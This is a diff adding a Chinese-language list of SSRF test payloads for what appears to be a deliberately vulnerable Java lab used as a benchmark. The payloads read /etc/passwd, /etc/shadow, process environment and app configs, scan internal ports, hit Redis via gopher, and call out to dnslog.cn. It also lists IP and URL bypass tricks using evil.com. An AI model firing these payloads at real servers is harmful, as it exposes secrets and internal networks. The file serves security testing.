@@ -1,0 +1,111 @@
+# SSRF (服务端请求伪造) 漏洞测试用例
+
+# ============================================
+# 1. URLConnection 方式
+# ============================================
+# 端点: /ssrf/urlconnection/vuln?url={payload}
+
+# 读取本地文件 (file:// 协议)
+url=file:///etc/passwd
+
+# 读取 hosts 文件
+url=file:///etc/hosts
+
+# 读取应用配置
+url=file:///opt/projects/benchmark/Qbenchmark/java-vuln-lab/src/main/resources/application.yml
+
+# 读取环境变量
+url=file:///proc/self/environ
+
+# 内网端口扫描 - SSH
+url=http://127.0.0.1:22
+
+# 内网端口扫描 - MySQL
+url=http://127.0.0.1:3306
+
+# 内网端口扫描 - Redis
+url=http://127.0.0.1:6379
+
+# 内网端口扫描 - Tomcat
+url=http://127.0.0.1:8080
+
+# DNS 外带验证 (使用 dnslog.cn)
+url=http://xxx.dnslog.cn/test
+
+# HTTP 请求 - 访问百度
+url=http://www.baidu.com
+
+
+# ============================================
+# 2. HttpURLConnection 方式
+# ============================================
+# 端点: /ssrf/httpurl/vuln?url={payload}
+
+# 读取文件
+url=file:///etc/passwd
+
+# 内网探测
+url=http://192.168.1.1
+
+# 绕过 IP 限制 - 使用域名
+url=http://localhost
+
+# 绕过 IP 限制 - 十六进制 IP
+url=http://0x7f000001
+
+
+# ============================================
+# 3. HttpClient 方式
+# ============================================
+# 端点: /ssrf/httpclient/vuln?url={payload}
+
+# HTTP 内网请求
+url=http://127.0.0.1:8080
+
+# Gopher 协议 - Redis 未授权访问
+url=gopher://127.0.0.1:6379/_AUTH
+
+# FTP 协议
+url=ftp://127.0.0.1:21
+
+
+# ============================================
+# 4. 下载文件功能
+# ============================================
+# 端点: /ssrf/download/vuln?url={payload}
+
+# 下载敏感文件 (Base64 编码返回)
+url=file:///etc/shadow
+
+# 下载应用配置
+url=file:///opt/projects/benchmark/Qbenchmark/java-vuln-lab/target/classes/application.yml
+
+
+# ============================================
+# SSRF 绕过技巧
+# ============================================
+# IP 绕过
+# - 127.0.0.1 -> 2130706433 (十进制)
+# - 127.0.0.1 -> 0x7f000001 (十六进制)
+# - 127.0.0.1 -> 017700000001 (八进制)
+# - 127.0.0.1 -> localhost@evil.com (重定向)
+
+# URL 格式绕过
+# - http://127.0.0.1:80@evil.com/
+# - http://evil.com@127.0.0.1/
+# - http://127.0.0.1#evil.com/
+
+# 协议绕过
+# - file:///etc/passwd
+# - file://localhost/etc/passwd
+# - file:///./././etc/passwd
+
+
+# ============================================
+# 验证方法
+# ============================================
+# 成功的 SSRF 特征:
+# 1. file:// 协议返回文件内容 (如 /etc/passwd 包含 "root:")
+# 2. 内网端口扫描返回服务响应
+# 3. DNS 外带请求收到 DNS 查询记录
+# 4. 下载功能返回文件 Base64 内容
